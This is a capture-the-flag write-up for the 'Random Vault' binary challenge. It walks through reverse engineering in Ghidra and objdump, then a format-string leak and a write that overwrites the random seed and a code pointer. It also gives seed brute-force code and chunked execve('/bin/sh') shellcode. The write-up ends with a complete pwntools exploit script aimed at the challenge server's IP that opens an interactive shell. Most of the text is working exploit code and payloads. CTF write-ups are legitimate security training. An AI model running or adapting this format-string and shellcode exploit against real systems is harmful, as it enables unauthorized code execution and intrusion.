# Random Vault

```
While analyzing data obtained through our cyber operations, our analysts have discovered an old service in HARPA infrastructure. This service has been used to store the agency's secrets, but it has been replaced by a more sophisticated one after a few years. By mistake, this service remained available on Internet until December 2019, when HARPA agents realized this flaw and took it down. We suspect this service is vulnerable. We need your help to exploit its vulnerability and extract the secrets that are still kept on the server.

Server: 200.136.252.34 1245

Server backup: 68.183.204.108 1245

https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/random_vault_679bf5b114c21f564eadec9b0016fb7bf3d9d100141afae8b59d1d44ee60ff31.tar.gz
```

After renaming a TON of stuff in ghidra, this is how the code looks:

![Main function](https://i-was-scammed-by.dabbot.org/53pZHpu.png "Main function")

![Read username function](https://i-was-scammed-by.dabbot.org/3nxas2e.png "Only allows one change")

Resets are basically
```c
  memset(EXECUTABLE_BUFFER,0,0xff0);
  CODE = code_default_address;
  now = time(NULL);
  NOW = (uint)now;
```

CODE is a global variable that holds an address to be executed after storing secrets.
EXECUTABLE_BUFFER is a buffer with read, write and execution permissions, so shellcode can
be stored there.
NOW stores a timestamp for seeding rand()

![Greet function](https://i-was-scammed-by.dabbot.org/2G6b59Y.png "Vulnerable to format string exploits")

`print_actions` calls `greet` and lists available actions.

Playing around with format string exploits, you can obtain the address `greet` returns to,

The 11th `%p` argument gives that address. Knowing it's offset can be found by searching for it's
bytes (which can be obtained from ghidra) with objdump in the binary.

```
 » alias disass='objdump -D random_vault -j .text -M intel'
 
 » disass | grep '48 8d 3d 7a 09 00 00'
     1750:	48 8d 3d 7a 09 00 00 	lea    rdi,[rip+0x97a]
```

Subtracting 0x1750 from the return address yields the base address for the code. `$BASE_ADDR = <pointer> - 0x1750`

Now to look for where the executable buffer is populated:

![Buffer write](https://javascript.is-bad.com/Hn7AfG4.png "Data written to executable buffer")

Looking at the disassembly, we can see this:

![Disassembly](https://javascript.is-bad.com/6bvi8Uu.png "Shows a load of the buffer address")

Back to objdump:
```
 » disass | grep '48 8d 05 2f 3a 00 00' -A 1
    15da:	48 8d 05 2f 3a 00 00 	lea    rax,[rip+0x3a2f]        # 5010 <stderr@@GLIBC_2.2.5+0x30>
    15e1:	48 01 d0             	add    rax,rdx
```

The buffer is located at `$BASE_ADDRESS + 0x15e1 + 0x3a2f` (remember RIP points to the *next* instruction)

It also calls `(*CODE)()`:
![More disassembly](https://i-was-scammed-by.dabbot.org/7kH8KBT.png "Dereferences CODE and calls it")

```
 » disass | grep '48 8b 15 e6 39 00 00' -A 1
    1613:	48 8b 15 e6 39 00 00 	mov    rdx,QWORD PTR [rip+0x39e6]        # 5000 <stderr@@GLIBC_2.2.5+0x20>
    161a:	b8 00 00 00 00       	mov    eax,0x0
```

The variable is at `$BASE_ADDRESS + 0x161a + 0x39e6` (in the python script below I used 0x1355 and 0x3cab,
since I got the address from another function, but both pairs add up to the same value)

To write the shellcode, I needed to figure out the offsets used in `store_secret`, so I extracted the
code that generates the offsets to a file and ran it.

If you notice the scanf specifier, only 8 bytes can be read, so the shellcode must be stitched together
with jumps. To avoid wasting precious bytes with jumps, I wanted to use the `JMP rel8` variant of it, which
adds a signed 8 bit integer to RIP, using up 2 bytes of space. But that requires that the addresses be close
to each other, which needed some brute forcing, with the following program:

`gcc source.S source.c -O3 -o brute && ./brute`

`3764` was the chosen seed (it was the lowest one, and made exploiting printf easier).

```asm
.intel_syntax noprefix

// int32_t get_next_index(int32_t secret_idx, int32_t* buffer)
get_next_index: .globl get_next_index
    push rbp
    mov rbp, rsp

    push rsi
    push rdi
    call rand
    pop rdi
    pop rsi
    cdq // Convert Doubleword to Quadword
        // The CDQ instruction copies the sign (bit 31) of the
        // value in the EAX register into every bit position in
        // the EDX register.
    shr edx, 0x18
    add eax, edx
//  too much effort to figure out what were the actual registers
//  so i just copied the bytes 1:1 from ghidra
//  start movzx
    .byte 0x0f
    .byte 0xb6
    .byte 0xc0
//  end   movzx
    sub eax, edx
    mov edx, eax
    mov eax, edi
    cdqe
    mov dword ptr [rsi + rax*0x4 - 0x30], edx
    mov eax, edi
    cdqe
    mov eax, dword ptr [rsi + rax*0x4 - 0x30]
    cdqe
    lea rdx, [eax * 0x8]
    mov rax, rdx

    pop rbp
    ret
```

```c 
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int32_t get_next_index(int32_t secret_idx, int32_t *buffer);

void gen(int32_t* dest) {
    int32_t buffer[2000] = {0};
    for(int32_t i = 0; i < 7; i++) { dest[i] = get_next_index(i, &buffer[1000]); }
}

int sort_fn(const void* a, const void* b) { return *(int*)a - *(int*)b; }

int main(void) {
    int32_t numbers[7];
    for(int32_t S = 0; S < 30000; S++) {
        srand(S);
        gen(numbers);
        qsort(numbers, 7, sizeof(int32_t), sort_fn);
        int found = 1;
        for(int32_t i = 0; i < 6; i++) {
            if(numbers[i + 1] - numbers[i] > 127) {
                found = 0;
                break;
            }
        }
        if(found) {
            printf("%d: ", S);
            for(int32_t i = 0; i < 7; i++) {
                printf("%d (+%d), ", numbers[i], 
                        i > 0 ? numbers[i] - numbers[i-1] : 0);
            }
            printf("\n  raw:");
            srand(S);
            gen(numbers);
            for(int32_t i = 0; i < 7; i++) { printf("%d ", numbers[i]); }
            printf("\n");
        }
    }
    return 0;
}
```

This writes our shellcode in the offsets `352, 272, 160, 496, 472, 544, 408`.
A bit of hand-written assembly later, I ended up with 

```asm
   0:	48 8d 7c 24 f8       	lea    rdi,[rsp-0x8]
   5:	eb 70                	jmp    77 <shellcode+0x77>
  
   7:	66 c7 47 06 68 00    	mov    WORD PTR [rdi+0x6],0x68
   d:	eb 50                	jmp    5f <shellcode+0x5f>
  
  f:	66 c7 47 04 2f 73    	mov    WORD PTR [rdi+0x4],0x732f
  15:	eb 38                	jmp    4f <shellcode+0x4f>
  
  17:	66 c7 47 02 69 6e    	mov    WORD PTR [rdi+0x2],0x6e69
  1d:	eb 40                	jmp    5f <shellcode+0x5f>
  
  1f:	66 c7 07 2f 62       	mov    WORD PTR [rdi],0x622f
  24:	eb 18                	jmp    3e <shellcode+0x3e>

  26:	b0 3b                	mov    al,0x3b
  28:	31 f6                	xor    esi,esi
  2a:	31 d2                	xor    edx,edx
  2c:	0f 05                	syscall 
```

which is equivalent to `execve("/bin/sh", NULL, NULL)`, with the difference that it'll definitely
crash the process when it returns.

The grouped lines are the 8-byte-or-less instruction groups that can be written, and must be written
to the first 6 offsets, from lower to higher. The seventh one can be whatever garbage you want, it won't
be executed.

In python:

```python
shellcode = [
    [ 0x66, 0xc7, 0x47, 0x04, 0x2f, 0x73, 0xeb, 0x38 ],  # 352
    [ 0x66, 0xc7, 0x47, 0x06, 0x68, 0x00, 0xeb, 0x50 ],  # 272
    [ 0x48, 0x8d, 0x7c, 0x24, 0xf8, 0xeb, 0x70 ],        # 160
    [ 0xb0, 0x3b, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05 ],  # 496
    [ 0x66, 0xc7, 0x07, 0x2f, 0x62, 0xeb, 0x18 ],        # 472
    [ 0xcc, 0xce ],                                      # 544
    [ 0x66, 0xc7, 0x47, 0x02, 0x69, 0x6e, 0xeb, 0x40 ],  # 408
]
for line in shellcode:
    if line[-1] != 0x05:
        line[-1] -= len(line)
```

The decrement is used to adjust the jump offsets to account for the RIP advancing, as they
were compiled as if RIP were the first instruction in each block. `[ 0xcc, 0xce ]` will just become
two int3s, but it could be anything you wanted. The if is needed to not corrupt the `syscall` instruction.

Now to jump into the shellcode.

We need to overwrite `CODE` so it points into the beginning of the shellcode. The value stored there
by default is `$BASE_ADDR + 0x134e + 0xfffffffffffffefd`, which is `$BASE_ADDR + 0x134e - 259`:

![More Ghidra Disassembly](https://javascript.is-bad.com/6wXvFTc.png "Disassembly of the default value")

```
 » disass | grep '48 8d 05 fd fe ff ff' -A 1
    1347:	48 8d 05 fd fe ff ff 	lea    rax,[rip+0xfffffffffffffefd]        # 124b <__cxa_finalize@plt+0x14b>
    134e:	48 89 05 ab 3c 00 00 	mov    QWORD PTR [rip+0x3cab],rax        # 5000 <stderr@@GLIBC_2.2.5+0x20>
```

This address will have most of it's bits equal to the shellcode address, so we can overwrite only what's different. However, it's still far enough that in some runs they'll have more than just the last two bytes differering, which makes it unusable. Just try again until it's something usable.

```python
if current_code_ptr_val >> 16 != shellcode_addr >> 16:
    log.error("More than 16 bits of difference! Please re-run")
    import sys
    sys.exit(1)

# Since only the last 16 bits are different, we can write only those
value_to_write = shellcode_addr & 0xFFFF
```

Now to overwrite the seed:

![Seed location](https://i-was-scammed-by.dabbot.org/6PZzKJw.png "Disassembly of the seed loading")

```
 » disass | grep '8b 05 85 3a 00 00' -A 1
    157d:	8b 05 85 3a 00 00    	mov    eax,DWORD PTR [rip+0x3a85]        # 5008 <stderr@@GLIBC_2.2.5+0x28>
    1583:	89 c7                	mov    edi,eax
```

`NOW = $BASE_ADDR + 0x1583 + 0x3a85`

The payload for writing the data is now

```python
# 3764 chars are written for the seed, so we need to write N - 3764
# chars to get the count to the value needed for the shellcode address
# but if the value is too small, it'd fail
if value_to_write < 3764:
    log.error("Value to write too small, please try again")
    import sys
    sys.exit(1)
value_to_write -= 3764

payload = ""
payload += "%03764d"                        # write 3764 characters, so we can overwrite the seed
payload += "%29$n"                          # overwrite time (aka seed) var. %n is an int, which is
                                            # 4 bytes (same size as the seed) in x86-64. This will
                                            # set it to exactly 3764, overwriting all previous bits.
payload += "%0" + str(value_to_write) + "d" # overwrite least significant address bits
                                            # the actual needed value needs to have 3764 subtracted
                                            # from it because we already wrote that many characters
                                            # for the seed.
payload += "%28$hn"                         # overwrite code pointer. %hn is a short, which is the
                                            # two first bytes in a little endian architecture, so
                                            # the pointer value is already right.
                                            # if it wasn't, we could just do pointer math to set the
                                            # address to the least significant bytes
payload += "P"*(8 - (len(payload) % 8))     # align the payload to 8 bytes, so the next two
                                            # addresses can be accessed
payload += p64(code_ptr_addr)               # this is the 28th value
payload += p64(current_time_addr)           # this is the 29th value
```

Now the only thing left to do is sending the shellcode, which can be done with

```python
def pack_shellcode(sc):
    return str(struct.unpack("<Q", ''.join([
        chr(x) for x in sc
    ]))[0])

def send_shellcode(s):
    send_command("2")
    for part in s:
        if len(part) > 8:
            raise Exception("Cannot write shellcode part with more than 8 bytes")
        part = part + [0xCC] * (8 - len(part))
        send_command(pack_shellcode(part))
    for i in range(7 - len(s)):
        send_command(breakpoints)
```

Final exploit:

```python
#!/bin/env python2
from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

#p = process("./random_vault")

#gdb.attach(p, 'continue')

p = remote("200.136.252.34", 1245)

def pack_shellcode(sc):
    return str(struct.unpack("<Q", ''.join([
        chr(x) for x in sc
    ]))[0])

breakpoints = pack_shellcode([0xCC] * 8)

# EXECUTABLE_CODE buffer load:
#     15da:	48 8d 05 2f 3a 00 00 	lea    rax,[rip+0x3a2f]        # 5010 <stderr@@GLIBC_2.2.5+0x30>
#     15e1:	48 01 d0             	add    rax,rdx 
buffer_start_offset=0x15e1 + 0x3a2f
buffer_offsets = [
    352, 272, 160, 496, 472, 544, 408
]

shellcode = [
    [ 0x66, 0xc7, 0x47, 0x04, 0x2f, 0x73, 0xeb, 0x38 ],  # 352
    [ 0x66, 0xc7, 0x47, 0x06, 0x68, 0x00, 0xeb, 0x50 ],  # 272
    [ 0x48, 0x8d, 0x7c, 0x24, 0xf8, 0xeb, 0x70 ],        # 160
    [ 0xb0, 0x3b, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05 ],  # 496
    [ 0x66, 0xc7, 0x07, 0x2f, 0x62, 0xeb, 0x18 ],        # 472
    [ 0xcc, 0xce ],                                      # 544
    [ 0x66, 0xc7, 0x47, 0x02, 0x69, 0x6e, 0xeb, 0x40 ],  # 408
]
for line in shellcode:
    if line[-1] != 0x05:
        line[-1] -= len(line)


# shellcode
"""
0000000000000000 <shellcode>:
   0:	48 8d 7c 24 f8       	lea    rdi,[rsp-0x8]
   5:	eb 70                	jmp    77 <shellcode+0x77>
  
   7:	66 c7 47 06 68 00    	mov    WORD PTR [rdi+0x6],0x68
   d:	eb 50                	jmp    5f <shellcode+0x5f>
  
  f:	66 c7 47 04 2f 73    	mov    WORD PTR [rdi+0x4],0x732f
  15:	eb 38                	jmp    4f <shellcode+0x4f>
  
  17:	66 c7 47 02 69 6e    	mov    WORD PTR [rdi+0x2],0x6e69
  1d:	eb 40                	jmp    5f <shellcode+0x5f>
  
  1f:	66 c7 07 2f 62       	mov    WORD PTR [rdi],0x622f
  24:	eb 18                	jmp    3e <shellcode+0x3e>

  26:	b0 3b                	mov    al,0x3b
  28:	31 f6                	xor    esi,esi
  2a:	31 d2                	xor    edx,edx
  2c:	0f 05                	syscall 

    lea rdi, [rsp-8]
    .byte 0xEB
    .byte 112
    mov word ptr[rdi+6], 0x68
    .byte 0xEB
    .byte 80
    mov word ptr[rdi+4], 0x732f
    .byte 0xEB
    .byte 56
    mov word ptr[rdi+2], 0x6e69
    .byte 0xEB
    .byte 64
    mov word ptr[rdi], 0x622f
    .byte 0xEB
    .byte 24

    mov al, 59
    xor esi, esi
    xor edx, edx
    syscall
"""

# need to find a return address (with printf leak), subtract from it the
# relative address of the instruction and obtain the program base address

# the address of the buffer can be obtained with `base_addr + buffer_start_offset`
# the address of the function currently stored in CODE can be calculated knowing
# it's relative address and the base address.
# finding the different bytes (which are the least significant) between the known
# shellcode location and the function is simple math, then the different bytes need
# to be written with printf

# step 1: leak a return address with the first printf string
# step 2: use the second printf string to overwrite CODE to
#         the address of the shellcode
# step 3: write the shellcode, which will instantly run it when done


# leaking return address
# printing with %p, the 11th value is the return address of the function calling
# printf, specifically the address of `lea    rdi,[rip+0x97a]`, which has relative
# address 0x1750

def send_command(c):
    log.debug("===> %s" % c)
    p.send(c + "\n")

def read_until(s):
    while True:
        line = p.recvline()
        log.debug("<=== %s" % line)
        if line.startswith(s):
            return line

def send_shellcode(s):
    send_command("2")
    for part in s:
        if len(part) > 8:
            raise Exception("Cannot write shellcode part with more than 8 bytes")
        part = part + [0xCC] * (8 - len(part))
        send_command(pack_shellcode(part))
    for i in range(7 - len(s)):
        send_command(breakpoints)
#    send_command("y")

# Send fake username
send_command("%p," * 11)
username = read_until("Hello, ")
log.info("Leaked username: %s" % username)
return_addr=int(username.split(",")[11], 16)
log.info("Leaked return address: %s" % hex(return_addr))
base_addr=return_addr - 0x1750
log.info("Base address: %s" % hex(base_addr))

buffer_start = base_addr + buffer_start_offset
log.info("Buffer starts at %s" % hex(buffer_start))

shellcode_addr = buffer_start + min(buffer_offsets)
log.info("First shellcode goes to %s" % hex(shellcode_addr))

code_ptr_addr = base_addr + 0x1355 + 0x3cab
log.info("Called address goes in %s" % hex(code_ptr_addr))

current_code_ptr_val = base_addr + 0x134e - 259
log.info("Called address current value is %s" % hex(current_code_ptr_val))

if current_code_ptr_val >> 16 != shellcode_addr >> 16:
    log.error("More than 16 bits of difference! Please re-run")
    import sys
    sys.exit(1)

value_to_write = shellcode_addr & 0xFFFF
log.info("Need to write %s/%d" % (hex(value_to_write), value_to_write))

current_time_addr = base_addr + 0x1583 + 0x3a85
log.info("Need to overwrite time at %s" % hex(current_time_addr))

log.info("Break at %s to stop before running shellcode" % hex(base_addr + 0x161f))

# diff = buffer_start - current_code_ptr_val
# (could be done with the offsets only, but since i can run code i might as
#  well just use what i already have)
# > diff = 0b100000011111101
# print(len("{0:b}".format(diff)))
# > 15
#
# only 15 bits are different, so we only need to overwrite two bytes with printf
# and since they're the least significant bytes, they're the first two in x86
# (which is a little endian architecture)
#
# so we set the format string to print `diff` characters then use %n to overwrite
# `code_ptr_addr`

log.info("Overwriting time and code pointer")
send_command("1") # change username

# 3764 chars are written for the seed, so we need to write N - 3764
# chars to get the count to the value needed for the shellcode address
# but if the value is too small, it'd fail
if value_to_write < 3764:
    log.error("Value to write too small, please try again")
    import sys
    sys.exit(1)
value_to_write -= 3764

# 19 * 8 bytes before the buffer on the stack
# + 5 arguments in registers
payload = ""
payload += "%03764d"                        # write 3764 characters, so we can overwrite the seed
payload += "%29$n"                          # overwrite time (aka seed) var. %n is an int, which is
                                            # 4 bytes (same size as the seed) in x86-64. This will
                                            # set it to exactly 3764, overwriting all previous bits.
payload += "%0" + str(value_to_write) + "d" # overwrite least significant address bits
                                            # the actual needed value needs to have 3764 subtracted
                                            # from it because we already wrote that many characters
                                            # for the seed.
payload += "%28$hn"                         # overwrite code pointer. %hn is a short, which is the
                                            # two first bytes in a little endian architecture, so
                                            # the pointer value is already right.
                                            # if it wasn't, we could just do pointer math to set the
                                            # address to the least significant bytes
payload += "P"*(8 - (len(payload) % 8))     # align the payload to 8 bytes, so the next two
                                            # addresses can be accessed
payload += p64(code_ptr_addr)               # this is the 28th value
payload += p64(current_time_addr)           # this is the 29th value
send_command(payload)
read_until("Hello, ")

raw_input("press enter to run shellcode...")
log.info("Sending and running shellcode")
send_shellcode(shellcode)

log.info("Enjoy :)")
p.interactive()
```